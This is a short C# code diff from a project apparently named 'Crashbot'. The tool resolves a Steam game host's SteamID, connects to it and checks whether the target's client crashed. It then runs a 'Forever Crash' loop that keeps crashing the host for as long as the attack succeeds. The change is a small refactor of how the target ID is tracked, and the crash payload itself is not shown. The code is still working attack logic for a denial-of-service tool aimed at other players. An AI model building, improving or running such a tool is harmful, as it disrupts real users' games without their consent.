@@ -95,10 +95,12 @@ namespace Crashbot
                 }
                 Console.WriteLine($"[{DateTime.Now}] Targeting '{targetName}' = {res}");
 
-                target = Program.VerifyHostSteamid(t, target);
+                // Check if the target is the host, if not, target the host
+                ulong tmp_target = target;
+                tmp_target = Program.VerifyHostSteamid(t, target);
 
                 Console.WriteLine($"[{DateTime.Now}] Connecting...");
-                var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);
+                var (conn, info) = ConnectAndWait(tmp_target, LongTimeoutOptions);
 
                 if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                 {
@@ -118,14 +120,13 @@ namespace Crashbot
 
                 // Check if the client crashed
                 Console.WriteLine($"[{DateTime.Now}] Checking target...");
-                var (_, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);
+                var (_, info2) = ConnectAndWait(tmp_target, ConnectionTimeoutOptions);
 
                 bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                 Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");
 
                 // Forever Crash
                 int count = 1;
-                ulong tmp_target = target;
                 while (crashed)
                 {
                     tmp_target = Program.VerifyHostSteamid(t, target);
